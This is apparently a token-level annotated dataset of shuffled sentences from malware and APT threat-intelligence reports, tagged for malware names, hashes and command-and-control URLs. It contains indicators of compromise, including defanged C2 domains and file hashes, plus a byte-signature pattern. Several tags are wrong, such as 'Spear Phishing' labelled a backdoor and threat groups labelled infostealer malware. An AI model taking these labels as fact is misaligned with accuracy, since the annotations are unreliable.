to O
assess O
if O
your O
systems O
are O
at O
risk O
. O

We O
also O
found O
several O
uploaded O
log O
files O
which O
indicate O
the O
presence O
of O
an O
Android O
RAT B-malware.unknown
. O

For O
example O
, O
the O
strings O
' O
LAVENDERX B-malware.drop
' O
and O
' O
LAVENDERengin B-malware.drop
' O
( O
which O
are O
dynamically O
built O
on O
the O
stack O
) O
are O
used O
to O
determi O
ne O
the O
implant O
's O
version O
. O

Exploit O
Document O
Filename O
: O

This O
quarterly O
report O
presents O
the O
targeted O
attack O
campaigns O
observed O
and O
mitigated O
by O
Trend O
Micro O
based O
on O
reported O
customer O
cases O
, O
as O
well O
as O
our O
own O
independently O
gathered O
data O
. O

Appendix O
C O
: O
List O
of O
Memory O
Offsets O
for O
Some O
ZxShell B-malware.backdoor
Functions O
13 O
. O

This O
parameter O
represents O
a O
hash O
of O
the O
password O
with O
which O
a O
remote O
user O
has O
to O
connect O
to O
Team O
Viewer O
client O
. O

Right O
from O
the O
start O
, O
the O
group O
stood O
out O
because O
of O
its O
use O
of O
an O
advanced O
, O
highly O
automated O
framework O
to O
support O
its O
targeted O
attacks O
. O

If O
software O
and O
environment O
check O
passes O
, O
the O
first O
stage O
payload O
will O
try O
to O
download O
the O
second O
stage O
payload O
from O
the O
command O
and O
control O
( O
C O
& O
C O
) O
server O
. O

In O
other O
words O
, O
it O
will O
convert O
the O
ASCII O
representations O
( O
0x30 O
, O
0x31 O
, O
... O
, O
0x39 O
) O
of O
the O
digits O
0 O
through O
9 O
into O
their O
equivalent O
integer O
representations O
( O
0x00 O
, O
0x01 O
, O
... O
, O
0x09 O
) O
. O

SHA256 O
of O
SSL O
certificate O
observed O
on O
6535abc68a777b82b8dca49ffbf2d80af7491e76020028a3e18186e1cad02abe B-hash
malicious O
infrastructure O
. O

Value O
subst_var_41C O
[ O
ESI O
] O
... O
253 O
254 O
255 O
0x00 O
0x01 O
0x02 O
0x03 O
0x04 O
... O
0xFD O
0xFE O
0xFF O

Figure O
8 O
: O
File O
management O
provides O
an O
easy-to-use O
menu O
that O
is O
activated O
by O
right-clicking O
on O
a O
file O
name O

https://crt.sh/?id=482419008 B-url.cncsvr
Domain O
associated O
with O
SSL O
certificate O
observed O
on O
malicious O
infrastructure O
. O

IOPlatformUUID O
0x3303 O
0x3303 O
# O
3333 O
# O
3344 O
# O
3355 O
# O
3377 O
# O
0x16 O
Hello O
message O
body O
All O
the O
important O
functionalities O
of O
the O
XAgent B-malware.backdoor
lie O
in O
its O
modules O
. O

Trend O
Micro O
researchers O
discovered O
a O
phishing O
email O
sent O
to O
South O
Korean O
organizations O
on O
March O
19 O
. O

ZxShell B-malware.backdoor
exploits O
this O
fact O
by O
cycling O
between O
each O
of O
the O
names O
, O
verifying O
the O
existence O
of O
the O
real O
service O
. O

Figure O
11 O
– O
Listing O
of O
FTP O
directory O
containing O
the O
PHP O
backdoor O
. O

The O
initial O
point O
of O
compromise O
seems O
to O
be O
highly O
targeted O
spam O
messages O
with O
a O
malicious O
VBS O
fi O
le O
attached O
. O

Referendum O
on O
Crimea/Crimean O
annexation O
Presidential O
Elections O
in O
Ukraine O
Malicious O
App O
Observed O
in O
Distribution O
on O
Forums O

For O
example O
, O
here O
is O
the O
command O
executed O
by O
some O
NBOT B-malware.drop
droppers O
in O
the O
context O
of O
ramFS O
: O
As O
a O
final O
indication O
that O
Dino B-malware.backdoor
belongs O
to O
Animal O
Farm O
menagerie O
, O
it O
is O
noticeable O
that O
the O
output O
of O
Dino B-malware.backdoor
's O
sysinfo O
command O
looks O
like O
an O
updated O
version O
of O
the O
' O
beacon O
' O
from O
the O
SNOWBALL O
implant O
described O
in O
the O
leaked O
CSE O
slides O
– O
part O
of O
operation O
SNOWGLOBE O
, O
which O
led O
to O
the O
discovery O
of O
Babar B-malware.unknown
: O

The O
final O
payload O
of O
the O
attack O
is O
a O
CAB O
file O
with O
the O
following O
MD5 O
: O
8844a537e7f533192ca8e81886e70fbc B-hash
The O
MS O
CAB O
file O
( O
md5 O
: O
8844a537e7f533192ca8e81886e70fbc B-hash
) O
contains O
4 O
malicious O
DLL O
files O
: O
Filename O
a6f14b547d9a7190a1f9f1c06f906063 O
cfgifut.dll O
e51ce28c2e2d226365bc5315d3e5f83e O
cldbct.dll O
067681b79756156ba26c12bc36bf835c O
cryptbase.dll O
f8a2d4ddf9dc2de750c8b4b7ee45ba3f O
msfte.dll O
The O
file O
cldbct.dll O
( O
e51ce28c2e2d226365bc5315d3e5f83e O
) O
connects O
to O
the O
following O
C2 O
: O
hXXp://webconncheck.myfw[.]us:8080/8xrss.php O
The O
modules O
are O
signed O
by O
an O
invalid O
digital O
certificates O
listed O
as O
' O
Tencent O
Technology O
( O
Shenzhen O
) O
Company O
Limited O
' O
with O
serial O
numbers O
, O
copied O
from O
real O
Tencent O
certificates O
: O
5d O
06 O
88 O
f9 O
04 O
0a O
d5 O
22 O
87 O
fc O
32 O
ad O
ec O
eb O
85 O
b0 O
71 O
70 O
bd O
93 O
cf O
3f O
18 O
9a O
e6 O
45 O
2b O
51 O
4c O
49 O
34 O
0e O

Tranchulas O
also O
serves O
as O
an O
official O
sponsor O
for O
the O
Pakistan O
CERT O
in O
addition O
to O
maintaining O
the O
official O
Pakistan O
CERT O
website O
( O
cert.org.pk O
) O
. O

As O
shown O
In O
Figure O
25 O
, O
the O
Fiddler O
Web O
debugger O
text O
wizard O
easily O
converts O
the O
raw O
traffic O
from O
Base64 O
to O
plain O
text O
. O

In O
this O
case O
the O
picture O
contains O
photos O
of O
members O
of O
the O
Ethiopian O
opposition O
group O
, O
Ginbot O
7 O
. O

The O
attacker O
used O
a O
domain O
which O
allowed O
them O
to O
try O
and O
fool O
the O
user O
. O

In O
other O
words O
, O
Komplex B-malware.backdoor
is O
an O
APT28/Sofacy O
component O
that O
can O
be O
distributed O
via O
email O
, O
disguised O
as O
a O
PDF O
document O
, O
to O
establish O
a O
foothold O
in O
a O
system O
. O

Three O
types O
of O
operating O
systems O
were O
used O
for O
testing O
purposes O
; O
all O
testing O
occurred O
on O
laptops O
. O

Figure O
18 O
: O
Contents O
of O
Dropped O
VBS O
File O

An O
engineering O
company O
that O
designs O
electrical O
substations O
, O
gas O
distribution O
pipelines O
, O
and O
water O
supply O
plants O
. O

However O
, O
it O
is O
unusual O
that O
a O
full O
SPLM B-malware.backdoor
backdoor O
was O
not O
detected O
on O
this O
system O
, O
nor O
was O
any O
powershell O
loader O
script O
. O

.SYSTEM\CurrentControlSet\Services\zhudongfangyu O
. O

Fiddler O
needs O
this O
to O
be O
converted O
to O
an O
equal O
sign O
for O
proper O
decoding O
. O
) O

An O
interesting O
feature O
of O
this O
exact O
XtremeRat B-malware.backdoor
is O
that O
it O
is O
digitally O
signed O
– O
seemingly O
by O
Microsoft O
: O
The O
certificate O
chain O
ends O
in O
an O
untrusted O
( O
faked O
) O
root O
certificate O
; O
so O
it O
will O
not O
validate O
properly O
. O

Gather O
network O
addresses O
and O
operating O
system O
version O
Execute O
arbitrary O
commands O
using O
' O
cmd.exe O
/c O
' O
The O
capability O
to O
execute O
system O
commands O
. O

Figure O
6 O
- O
Signature O
Verified O
by O
VirusTotal O
The O
Cisco O
AnyConnect O
, O
' O
vpnui.exe O
' O
, O
appears O
to O
be O
a O
legitimate O
application O
signed O
by O
Cisco O
with O
the O
following O
digital O
signature O
details O
: O

To O
combat O
threats O
, O
root9B O
realized O
that O
technology O
is O
not O
the O
problem O
. O

\HKCU\SOFTWARE\Classes\AppX O
[ O
a-f0-9 O
] O
{ O
32 O
} O
, O
which O
is O
quite O
generic O
. O

The O
hashes O
are O
hardcoded O
within O
the O
binary O
, O
and O
will O
be O
compared O
to O
hashed O
library O
exports O
by O
the O
API O
resolution O
routine O
. O

The O
Freegate B-malware.infosteal
software O
begins O
operating O
, O
and O
quickly O
prompts O
the O
user O
for O
an O
update O
. O

Version O
1.0 O
– O
23/11/2015 O
All O
Rights O
Reserved O
To O
Minerva O
Labs O
LTD O
and O
ClearSky O
Cyber O
Security O
, O
2015 O
Executive O
Summary O
......................................................................................................................... O
3 O
The O
Group O
Attack O
Cycle O
................................................................................................................... O
4 O
Step O
One O
– O
Spear O
Phishing B-malware.backdoor
........................................................................................................... O
4 O
Step O
Two O
- O
Droppers B-malware.unknown
Matryoshka I-malware.unknown
................................................................................................ O
6 O
Dropper O
– O
SCR O
PE O
File O
.............................................................................................................. O
6 O
Step O
Three O
- O
Reflective O
Loader O
.................................................................................................... O
8 O
Step O
Four O
- O
RAT O
Component O
...................................................................................................... O
10 O
Runtime O
API O
Address O
Resolution O
........................................................................................... O
10 O
Installation O
and O
Persistence O
.................................................................................................. O
10 O
DNS O
Command O
& O
Control O
...................................................................................................... O
11 O
Common O
RAT O
Capabilities O
......................................................................................................... O
13 O
Improvement O
Over O
Time O
........................................................................................................... O
15 O
About O
Us O
.................................................................................................................................... O
16 O
Minerva O
Labs O
......................................................................................................................... O
16 O
ClearSky O
Cyber O
Security O
......................................................................................................... O
16 O
Appendix O
A O
– O
Spear O
Phishing B-malware.backdoor
Examples O
......................................................................................... O
17 O
Appendix O
B O
– O
Indicators O
of O
Compromise O
....................................................................................... O
20 O
The O
Middle O
East O
has O
been O
a O
cyber O
warfare O
hotspot O
for O
almost O
a O
decade O
now O
, O
a O
theatre O
for O
some O
of O
the O
most O
advanced O
threats O
the O
world O
has O
ever O
witnessed O
. O

Some O
hashes O
of O
the O
backdoor O
have O
been O
provided O
in O
BadCyber O
's O
technical O
analysis O
: O

5353 O
' O
. O

This O
backdoor O
also O
has O
functionality O
to O
load O
additional O
plugins O
from O
the O
command O
and O
control O
server O
. O

As O
in O
previous O
cases O
, O
the O
attackers O
still O
serve O
copied O
content O
on O
IPs O
, O
domains O
and O
hosts O
they O
control O
. O

On O
17 O
July O
2010 O
, O
ESET O
detected O
another O
driver O
' O
in O
the O
wild O
' O
- O
jmidebs.sys O
- O
which O
was O
very O
similar O
to O
the O
already O
known O
mrxcls.sys O
, O
but O
had O
been O
created O
just O
three O
days O
before O
it O
was O
discovered O
. O

InfoOS O
InfoOS O
ScreenShot O
ScreenShot O
ScreenShot O
Password O

APT12 O
has O
previously O
used O
the O
THREEBYTE B-malware.backdoor
backdoor O
. O

Example O
of O
YouTube O
video O
shown O
to O
victim O
: O
While O
the O
victim O
sees O
the O
decoy O
YouTube O
video O
or O
news O
website O
, O
a O
php O
file O
( O
g.php O
) O
that O
contains O
a O
hex-encoded O
malicious O
binary O
is O
fetched O
. O

Said O
object O
is O
configured O
to O
grab O
keyboard O
events O
through O
GetRawInputData O
. O

1 O
* O
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 O
$ O
~ O

China B-malware.backdoor
Chopper I-malware.backdoor
is O
a O
simple O
backdoor O
in O
terms O
of O
components O
. O

Access O
to O
this O
mail O
by O
anyone O
else O
is O
unauthorised O
. O

ANEL B-malware.backdoor
will O
send O
the O
infected O
environment O
's O
information O
to O
the O
C O
& O
C O
server O
. O

China B-malware.backdoor
Chopper I-malware.backdoor
is O
stealthy O
due O
to O
a O
number O
of O
factors O
, O
including O
the O
following O
: O
• O
Size O
• O
Server-side O
content O
• O
Client-side O
content O
• O
AV O
detection O
rate O
( O
or O
lack O
thereof O
) O
Malicious O
and O
benign O
software O
usually O
suffers O
from O
the O
same O
principle O
: O
more O
features O
equals O
more O
code O
, O
which O
equals O
larger O
size O
. O

These O
compromises O
were O
discovered O
following O
the O
identification O
of O
malicious O
JavaScript O
that O
had O
been O
added O
to O
legitimate O
code O
on O
the O
impacted O
websites O
. O

root9B O
operators O
and O
software O
developers O
designed O
and O
constructed O
proprietary O
methods O
of O
discovering O
and O
dealing O
with O
adversaries O
. O

This O
malware O
provides O
the O
attacker O
with O
clandestine O
remote O
access O
to O
the O
victim O
's O
machine O
as O
well O
as O
comprehensive O
data O
harvesting O
and O
exfiltration O
capabilities O
. O

Ablyazov O
's O
son-in-law O
and O
his O
attorney O
and O
linked O
with O
this O
campaign O
were O
variants O
of O
the O
HackBack B-malware.unknown
Trojan O
. O

For O
example O
, O
address O
0x142C11C O
has O
an O
instruction O
that O
loads O
an O
encoded O
string O
which O
is O
decoded O
as O
' O
. O

FireEye O
researchers O
also O
discovered O
two O
possibly O
related O
campaigns O
utilizing O
two O
other O
backdoors O
known O
as O
THREEBYTE B-malware.backdoor
and O
WATERSPOUT B-malware.backdoor
. O

Table O
2 O
highlights O
incidents O
in O
which O
victims O
suffered O
a O
compromise O
that O
FireEye O
iSIGHT O
Intelligence O
, O
other O
authorities O
, O
or O
the O
victims O
themselves O
later O
attributed O
to O
the O
group O
we O
track O
as O
APT28 B-malware.infosteal
. O

However O
, O
the O
WATERSPOUT B-malware.backdoor
campaign O
shared O
several O
traits O
with O
the O
RIPTIDE B-malware.backdoor
and O
HIGHTIDE B-malware.backdoor
campaign O
that O
we O
have O
attributed O
to O
APT12 O
. O

Name O

IRONGATE B-malware.backdoor
detects O
malware O
detonation/observation O
environments O
, O
whereas O
Stuxnet O
looked O
for O
the O
presence O
of O
antivirus O
software O
. O

substituted O
with O
the O
local O
machine O
IP O
address O
to O
achieve O
code O
execution O
on O
the O
system O
. O

hXXp://niggmhggmeggmkggmfggmdggidggngggmjgg.ijhlokga.aisicoin[.]com/ B-url.unknown
13/139756-Ses-Ufali-L I-url.unknown

One O
is O
an O
article O
about O
Pakistan O
's O
indigenous O
UAV O
industry O
which O
is O
attributed O
to O
author O
Aditi O
Malhotra O
, O
an O
Indian O
writer O
and O
Associate O
Fellow O
at O
the O
Centre O
for O
Land O
Warfare O
Studies O
( O
CLAWS O
) O
in O
New O
Delhi O
. O

' O
e7dd9678b0a1c4881e80230ac716b21a41757648d71c538417755521438576f6.exe O
' O

Figure O
9 O
. O

FireEye O
, O
Inc O
. O

관리 O
서버를 O
이용한 O
공격의 O
경우 O
, O
공격자는 O
공격 O
대상의 O
관리자 O
페이지 O
계정을 O
탈취하여 O
정상 O
파일 O
대신 O
악성코드를 O
배포할 O
수 O
있다 O
. O

$ O
interval O
$ O
downloadexec O
파일 O
다운로드 O
후 O
실행 O
$ O
download O
파일 O
다운로드 O
( O
기본 O
) O
Cmd.exe O
실행 O
[ O
표 O
2 O
] O
Rifdoor B-malware.backdoor
주요 O
명령 O
Rifdoor B-malware.backdoor
변형은 O
[ O
표 O
3 O
] O
과 O
같이 O
PDB O
정보가 O
조금씩 O
다르다 O
. O

If O
access O
to O
this O
service O
is O
required O
, O
it O
should O
be O
permitted O
only O
for O
those O
IP O
's O
that O
require O
access O
. O

SHOOTING O
ELEPHANTS O
.................................................................................... O
4 O
2 O
. O

The O
client O
binary O
is O
packed O
with O
UPX O
and O
is O
220,672 O
bytes O
in O
size O
, O
as O
shown O
in O
Figure O
1 O
. O

The O
' O
lremit_Transfer_Error_Page.jar B-malware.infosteal
' O
malware O
was O
sent O
in O
a O
phishing O
email O
that O
contained O
some O
of O
the O
following O
details O
: O

The O
domains O
listed O
in O
the O
Detect O
section O
represent O
a O
signifi O
cant O
set O
of O
those O
currently O
known O
to O
be O
operating O
. O

Also O
you O
can O
decrypt O
3 O
files O
for O
test O
. O

The O
collection O
of O
such O
tactical O
artillery O
force O
positioning O
intelligence O
by O
FANCY O
BEAR O
further O
supports O
CrowdStrike O
's O
previous O
assessments O
that O
FANCY O
BEAR O
is O
likely O
affiliated O
with O
the O
Russian O
military O
intelligence O
( O
GRU O
) O
, O
and O
works O
closely O
with O
Russian O
military O
forces O
operating O
in O
Eastern O
Ukraine O
and O
its O
border O
regions O
in O
Russia O
. O

Here O
, O
the O
contents O
of O
the O
PHP O
version O
are O
just O
as O
minimalistic O
. O

This O
malicious O
Word O
document O
had O
an O
MD5 O
of O
499bec15ac83f2c8998f03917b63652e B-hash
and O
dropped O
a O
backdoor O
to O
C O
: O
\DOCUMENTS O
and O
SETTINGS\ O
{ O
user O
} O
\LOCAL O
SETTINGS\Temp\word.exe O
. O

Unkno O
wn O
Unkno O
wn O

Sleep O
For O
: O
10.100000 O
Minutes O
! O
, O
indicating O
that O
the O
C2 O
sever O
can O
not O
be O
reached O
and O
the O
malware O
will O
sleep O
for O
a O
fixed O
amount O
of O
time O
. O

USB O
File O
Collector O
: O
Searches O
for O
variety O
of O
file O
types O
on O
USB O
drives O
( O
including O
doc O
, O
docx O
, O
xls O
, O
xlsx O
, O
ppt O
, O
pptx O
, O
pdf O
, O
zip O
, O
rar O
, O
db O
, O
txt O
) O
. O

ARMED O
CONFLICT O
IN O
UKRAINE O

2017 O
. O

Web O
. O

Web O
. O

The O
link O
appears O
to O
have O
been O
made O
from O
the O
use O
of O
the O
DerUsbi B-malware.infosteal
malware O
family O
though O
, O
which O
we O
know O
to O
be O
used O
by O
several O
espionage O
actors O
. O

http://www.symantec.com/security_response/earthlink_writeup.jsp?docid=2015-040923-3643-99 B-url.normal
https://www.sophos.com/en-us/threat-center/threat-analyses/viruses-and-spyware/Troj~Agent-AMEY/detailed-analysis.aspx B-url.normal
https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/a_museu B-url.normal
m_of_api_obfuscation_on_win32.pdf I-url.normal
https://github.com/MinervaLabsResearch/BlogPosts B-url.normal

The O
malware O
performs O
the O
following O
activities O
: O
Builds O
imports O
by O
dynamically O
loading O
APIs O
Decrypts O
strings O
needed O
for O
control O
server O
communications O
Performs O
control O
server O
communications O
Handles O
commands O
issued O
by O
the O
control O
server O
Uninstalls O
self O
from O
the O
system O
The O
malicious O
thread O
dynamically O
loads O
the O
APIs O
it O
needs O
at O
the O
beginning O
of O
its O
execution O
using O
LoadLibrary O
( O
) O
and O
GetProcAddress O
( O
) O
. O

In O
addition O
, O
Cybereason O
uncovered O
new O
variants O
of O
the O
' O
Denis O
' O
backdoor O
and O
managed O
to O
attribute O
the O
backdoor O
to O
the O
OceanLotus O
Group O
– O
a O
connection O
that O
had O
not O
been O
publicly O
reported O
before O
. O

There O
is O
a O
FinSpy B-malware.backdoor
server O
in O
an O
IP O
range O
registered O
to O
' O
Verizon O
Wireless O
. O
' O

US$25k.jar B-malware.infosteal

98fb1014f6e90290da946fdbca583334 B-hash
Server O
Platino8 O

The O
Techniques O
the O
group O
uses O
keep O
evolving O
through O
time O
. O

So O
much O
so O
that O
Microsoft O
did O
a O
takedown O
in O
2012 O
. O

Some O
variants O
of O
EvilGrab B-malware.drop
delete O
the O
.EXE B-malware.drop
file O
after O
installation O
to O
cover O
its O
tracks O
more O
effectively O
. O

This O
observation O
may O
reveal O
that O
the O
DragonOK B-malware.infosteal
group O
is O
physically O
located O
in O
the O
Jiangsu O
province O
. O

The O
algorithm O
will O
collect O
the O
op-code O
strings O
of O
each O
instruction O
in O
the O
function O
first O
( O
Figure O
5 O
) O
. O

In O
the O
second O
set O
they O
are O
making O
use O
of O
a O
dynamic O
DNS O
service O
by O
ChangeIP.com B-url.normal
. O

The O
exploit O
, O
which O
takes O
advantage O
of O
CVE-2018-4878 O
, O
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
such O
as O
an O
implant O
. O

Institute O
for O
Science O
and O
International O
Security O
[ O
online O
] O
22 O
December O
2010 O
, O
Available O
: O
http://isis-online.org/isis-reports/detail/did-stuxnet-take-out-1000-centrifuges-atthe-natanz-enrichment-plant/ B-url.normal
( O
Accessed O
: O
18 O
April O
2013 O
) O
' O
10 O
Days O
of O
Rain O
in O
Korea O
, O
' O
McAfee O
Blog O
Central O
[ O
online O
] O
5 O
July O
2011 O
, O
Available O
: O
http://blogs.mcafee.com/mcafee-labs/10-days-of-rain-in-korea B-url.normal
( O
Accessed O
: O
18 O
April O
2013 O
) O
' O
Ten O
Days O
of O
Rain O
Whitepaper O
, O
' O
McAfee O
, O
5 O
July O
2011 O
' O
SK O
Hack O
by O
an O
Advanced O
Persistent O
Threat O
, O
' O
Command O
Five O
[ O
online O
] O
September O
2011 O
, O
Available O
: O
http://www.commandfive.com/papers/C5_APT_SKHack.pdf B-url.normal
( O
Accessed O
: O
18 O
April O
2013 O
) O
Moon-young O
Lee O
, O
' O
Personal O
information O
hack O
traced O
to O
Chinese O
IP O
address O
' O
The O
Hankyoreh O
[ O
online O
] O
12 O
August O
2011 O
, O
Available O
: O
http://www.hani.co.kr/arti/english_edition/e_national/491514.html B-url.normal
( O
Accessed O
: O
18 O
April O
2013 O
) O
' O
South O
Korea O
Probe O
Blames O
North O
for O
Cyber O
Attack O
' O
VOA O
News O
[ O
online O
] O
10 O
April O
2013 O
, O
Available O
: O
http://www.voanews.com/articleprintview/1638361.html B-url.normal
( O
Accessed O
: O
18 O
April O
2013 O
) O
J.A.P. O
Marpaung O
, O
M O
. O

Moreover O
, O
we O
decided O
to O
further O
investigate O
the O
detection O
rate O
of O
this O
new O
file O
on O
VirusTotal O
. O

Attachments O
Used O
In O
Targeted O
Attacks O

Decrypted O
version O
of O
comms O
from O
Figure O
2 O
. O

Detailed O
list O
of O
running O
processes O
and O
their O
owners O
. O

If O
Asruex B-malware.drop
does O
not O
detect O
a O
virtual O
machine O
, O
it O
executes O
one O
of O
the O
following O
executable O
files O
, O
and O
injects O
a O
DLL O
file O
which O
is O
contained O
in O
Asruex B-malware.drop
. O

Any O
use O
of O
the O
technical O
documentation O
or O
the O
information O
contained O
herein O
is O
at O
the O
risk O
of O
the O
user O
. O

Below O
screen O
shot O
shows O
the O
recipients O
associated O
with O
Mazagon O
Dock O
Shipbuilders O
Limited O
( O
MDL O
) O
, O
this O
information O
was O
determined O
from O
the O
Email O
header O
. O

9563e2f443c3b4e1b00f25be0a30d56e B-hash
FEIB_Samples_pwd O
( O
Virus O
) O
.zi_ O
TW O
Filenames O

// O
100017F0 O
$ O
= O
{ O
66 O
[ O
4-7 O
] O
56 O
40 O
83 O
f8 O
2d O
7c O
? O
? O
} O

The O
top O
five O
countries O
include O
Italy O
, O
Turkey O
, O
Belgium O
, O
Algeria O
, O
and O
France O
. O

DeleteUrlCacheEntryA O
wininet.dll O
advapi32.dll O
kernel32.dll O
e O
, O
O O
, O
A O
e O
, O
C O
, O
A O
p O
, O
O O
, O
A O
p O
, O
S O
, O
A O
p O
, O
E O
, O
A O
p O
, O
Q O
, O
A O
e O
, O
R O
, O
e O
e O
, O
C O
, O
e O
S O
, O
V O
, O
A O
C O
, O
s O
, O
y O
O O
, O
K O
, O
A O
D O
, O
K O
, O
A O
D O
, O
V O
, O
A O
U O
, O
r O
, O
A O
v O
, O
t O
, O
S O
k O
, O
A O
, O
A O
W O
, O
E O
, O
c O
C O
, O
M O
, O
A O
U O
, O
V O
, O
e O
M O
, O
O O
, O
e O
3,8,12 O
3,8,15 O
3,4,15 O
3,4,15 O
3,4,14 O
3,4,13 O
3,8,15 O
3,8,18 O
3,6,13 O
3,6,10 O
3,7,12 O
3,9,12 O
3,9,14 O
3,6,11 O
3,6,12 O
3,6,17 O
0,3,6 O
0,10,17 O
0,5,14 O
0,7,12 O
InternetOpenA O
InternetConnectA O
HttpOpenRequestA O
HttpSendRequestA O
HttpEndRequestA O
HttpQueryInfoA O
InternetReadFile O
InternetCloseHandle O
RegSetValueExA O
RegCloseKey O
RegOpenKeyExA O
RegDeleteKeyA O
RegDeleteValueA O
GetUserNameA O
ConvertSidToStringSidA O
LookupAccountNameA O
WinExec O
CreateFileMappingA O
UnmapViewOfFile O
MapViewOfFile O

md5 O
: O
c488a8aaef0df577efdf1b501611ec20 B-hash
sha1 O
: O
5ea6ae50063da8354e8500d02d0621f643827346 B-hash
sha256 O
: O
81531ce5a248aead7cda76dd300f303dafe6f1b7a4c953ca4d7a9a27b5cd6cdf B-hash

Given O
the O
ongoing O
development O
nature O
of O
this O
malware O
, O
it O
meant O
another O
variant O
was O
most O
likely O
due O
. O

2 O
The O
primary O
difference O
is O
that O
EvilGrab B-malware.drop
variants O
have O
multiple O
layers O
of O
shellcode O
. O

Port O

Analysis O
of O
the O
Dropped O
Executable O
( O
officeupdate.exe O
) O

This O
APK O
file O
targets O
only O
Android-based O
smartphones O
. O

Brute O
force O
attempts O
showed O
that O
this O
folder O
also O
contained O
stisvc.exe B-malware.unknown
( O
md5 O
f2a1ca02bf4a63a3d4a6c6464f5a925b B-hash
) O
and O
reg.exe B-malware.unknown
; O
these O
have O
same O
functionality O
as O
the O
identically O
named O
executables O
found O
on O
games-playbox[.]com B-url.cncsvr
. O

There O
are O
3 O
types O
of O
lists O
recognized O
by O
ZxShell B-malware.backdoor
: O
plain O
ip O
addresses O
, O
HTTP O
and O
FTP O
addresses O
. O

In O
this O
sample O
, O
however O
, O
the O
module O
names O
were O
changed O
from O
actors O
and O
characters O
' O
names O
to O
car O
models O
, O
namely O
' O
BMW_x1 B-malware.unknown
' O
, O
' O
BMW_x2 B-malware.unknown
' O
and O
up O
to O
' O
BMW_x8 B-malware.unknown
' O
. O

Unfortunately O
for O
our O
theory O
, O
the O
way O
this O
is O
implemented O
in O
older O
BlackEnergy O
variants O
is O
quite O
different O
; O
the O
code O
is O
more O
generic O
and O
the O
list O
of O
extensions O
to O
target O
is O
initialized O
at O
the O
beginning O
, O
and O
passed O
down O
to O
the O
recursive O
disk O
listing O
function O
. O

When O
the O
device O
was O
registered O
on O
the O
MDM B-malware.infosteal
server O
, O
roaming O
was O
disabled O
. O

hxxp://sap.misapor[.]ch/vishop/view.jsp?pagenum=1 B-url.unknown
hxxps://www.eye-watch[.]in/design/fancybox/Pnf.action B-url.unknown

The O
original O
installation O
batch O
script O
ensures O
that O
the O
miner O
application O
works O
well O
so O
that O
it O
will O
kill O
all O
scheduled O
tasks O
( O
other O
bitcoin O
mining O
applications O
) O
which O
may O
interfere O
with O
the O
running O
tool O
. O

As O
illustrated O
in O
the O
example O
below O
( O
Fig O
. O

This O
lead O
us O
into O
speculating O
that O
the O
malicious O
code O
was O
developed O
as O
part O
of O
targeted O
attacks O
against O
the O
Italian O
Marina O
Militare O
, O
or O
some O
other O
entities O
associated O
with O
it O
. O

APT32 B-malware.infosteal
demonstrates O
how O
accessible O
and O
impactful O
offensive O
capabilities O
can O
be O
with O
the O
proper O
investment O
and O
the O
flexibility O
to O
embrace O
newly-available O
tools O
and O
techniques O
. O

1985 O
is O
the O
default O
port O
for O
the O
malware O
, O
1986 O
is O
the O
lazy O
variation O
of O
that O
port O
. O

服务端测试 O
( O
2 O
) O

22 O
. O

The O
main O
purpose O
is O
to O
inspect O
SWIFT O
messages O
for O
strings O
defined O
in O
the O
configuration O
file O
. O

They O
noted O
similar O
targeting O
campaigns O
that O
were O
observed O
exploiting O
numerous O
industries O
and O
organizations O
within O
Norway O
, O
Pakistan O
, O
US O
, O
Iran O
, O
China O
, O
Taiwan O
, O
Thailand O
, O
Jordan O
, O
Indonesia O
, O
UK O
, O
Germany O
, O
Austria O
, O
Poland O
, O
and O
Romania O
. O

A O
PwnCode O
. O

2.2.3 O
. O

All O
rights O
reserved O
. O

Only O
one O
maintained O
the O
Filesystem.dll O
code O
, O
while O
another O
maintained O
ProcessRetranslator.dll O
code O
. O

The O
payloads O
are O
diversifi O
ed O
and O
include O
capabilities O
to O
download O
and O
execute O
additional O
binary O
fi O
les O
, O
collect O
private O
information O
and O
remotely O
execute O
commands O
on O
the O
system O
. O

Perhaps O
not O
entirely O
. O

Avoiding O
these O
toolsets O
during O
analysis O
makes O
the O
overall O
investigation O
even O
more O
complex O
. O

The O
URL O
in O
question O
points O
to O
: O
This O
link O
does O
not O
work O
and O
will O
redirect O
a O
visitor O
back O
to O
the O
main O
page O
of O
the O
website O
. O

One O
of O
these O
name O
servers O
, O
BULKBREAKERS.COM B-url.cncsvr
, O
contains O
several O
other O
international O
financial O
institutions O
. O

Overall O
, O
the O
malware O
is O
very O
cautious O
and O
deterministic O
in O
running O
its O
main O
code O
. O

Win32/Spy.Agent.ORM B-malware.infosteal
( O
also O
known O
as O
Win32/Toshliph O
) O
is O
a O
trojan O
used O
as O
one O
of O
their O
first-stage O
payloads O
by O
the O
Carbanak B-malware.infosteal
gang O
. O

20 O

The O
code O
above O
uses O
the O
chr O
( O
) O
function O
to O
convert O
an O
integer O
into O
a O
character O
, O
which O
is O
then O
passed O
as O
an O
argument O
to O
the O
ASP O
Request O
( O
) O
object O
. O

It O
is O
not O
clear O
why O
EvilGrab B-malware.drop
specifically O
targets O
these O
products O
. O

This O
focused O
intelligence O
and O
detection O
effort O
led O
to O
new O
external O
victim O
identifications O
as O
well O
as O
providing O
sufficient O
technical O
evidence O
to O
link O
twelve O
prior O
intrusions O
, O
consolidating O
four O
previously O
unrelated O
clusters O
of O
threat O
actor O
activity O
into O
FireEye O
's O
newest O
named O
advanced O
persistent O
threat O
group O
: O
APT32 B-malware.infosteal
. O

Strategic O
cyber O
LLC O
Founder O
and O
Principal O
January O
, O
2012-now O
Delaware O
Air O
National O
Guard O
Major O
2009-now O
Cobalt O
strike O
Automattic O
Principal O
Investigator O
November O
, O
2011- O
May O
, O
2012 O
Senior O
Security O
Engineer O
August O
, O
2010 O
– O
June O
, O
2011 O
Code O
Wrangler O
July O
, O
2009 O
– O
August O
, O
2010 O
Feedback O
Army O
, O
After O
the O
Deadline O
Founder O
July O
, O
2008 O
–November O
, O
2009 O
Air O
Force O
Research O
Laboratory O
Systems O
Engineer O
April O
, O
2006 O
– O
March O
, O
2008 O
US O
Air O
Force O
Communications O
and O
March O
, O
2004 O
- O
March O
, O
2008 O
Information O
Officer O

The O
latter O
decrypts O
the O
final O
layer O
: O
the O
backdoor O
. O

A O
series O
of O
samples O
show O
up O
that O
do O
not O
follow O
the O
pattern O
. O

APT O
Trends O
report O
Q3 O
2017 O
Wild O
Neutron O
– O
Economic O
espionage O
threat O
actor O
returns O
with O
new O
tricks O
The O
Naikon O
APT O
and O
the O
MsnMM O
Campaigns O
